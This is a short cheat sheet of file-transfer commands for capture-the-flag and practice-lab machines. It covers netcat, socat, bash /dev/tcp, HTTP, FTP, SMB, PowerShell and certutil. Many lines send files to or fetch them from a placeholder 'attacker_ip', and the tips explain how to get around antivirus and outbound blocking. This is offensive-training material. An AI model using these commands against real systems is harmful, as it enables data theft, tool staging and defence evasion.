# 🔹 1. SCP (Secure Copy)

Works over SSH.

### From attacker → target

`scp file.txt user@target_ip:/tmp/file.txt`

### From target → attacker

`scp user@target_ip:/tmp/file.txt .`

---

# 🔹 2. Netcat (nc) 🔥 (Most used in CTFs)

Fast and works even without authentication.

### Receiver (attacker)

nc -nlvp 4444 > file.txt

### Sender (target)

nc attacker_ip 4444 < file.txt

💡 Works great when SSH is unavailable.

---

# 🔹 3. Python HTTP Server

Very reliable and easy.

### Attacker (serve file)

python3 -m http.server 8000

### Target (download file)

wget http://attacker_ip:8000/file.txt

or

curl http://attacker_ip:8000/file.txt -o file.txt

---

# 🔹 4. Wget

If target has internet or internal connectivity.

wget http://attacker_ip/file.txt

---

# 🔹 5. Curl

Alternative to wget.

curl http://attacker_ip/file.txt -o file.txt

---

# 🔹 6. FTP (via Python or tools)

### Attacker (Python FTP server)

pip install pyftpdlib  
python3 -m pyftpdlib -p 21

### Target

ftp attacker_ip

Then:

get file.txt

---

# 🔹 7. SMB (Windows-friendly)

Very useful in Windows privilege escalation.

### Attacker (Impacket SMB server)

impacket-smbserver share .

### Target (Windows)

copy \\attacker_ip\share\file.txt C:\Temp\file.txt

---

# 🔹 8. PowerShell (Windows) 🔥

Works even when tools are limited.

Invoke-WebRequest -Uri http://attacker_ip/file.txt -OutFile file.txt

Or shorter:

iwr http://attacker_ip/file.txt -o file.txt

---

# 🔹 9. Certutil (Windows built-in)

Super useful when PowerShell is restricted.

certutil -urlcache -split -f http://attacker_ip/file.txt file.txt

---

# 🔹 10. Base64 Transfer (When nothing works)

### Attacker

base64 file.txt

### Target

echo "<base64_string>" | base64 -d > file.txt

---

# 🔹 11. Socat (Advanced Netcat alternative)

### Receiver

socat TCP-LISTEN:4444,fork file:file.txt

### Sender

socat TCP:attacker_ip:4444 file:file.txt

---

# 🔹 12. TFTP (Sometimes available)

### Attacker

sudo atftpd --daemon --port 69 /path/to/files

### Target

tftp attacker_ip  
get file.txt

---

# 🔹 13. Bash /dev/tcp Trick (No tools needed)

cat file.txt > /dev/tcp/attacker_ip/4444

Receiver:

nc -nlvp 4444 > file.txt

---

# 🔥 Pro Tips (Important for PG boxes)

- Always check:
    
    which wget curl nc python python3 certutil
    
- If outbound blocked → use **reverse transfer (target → attacker)**
- If AV blocks tools → use **certutil or base64**
- For Windows → prioritize:
    - PowerShell
    - certutil
    - SMB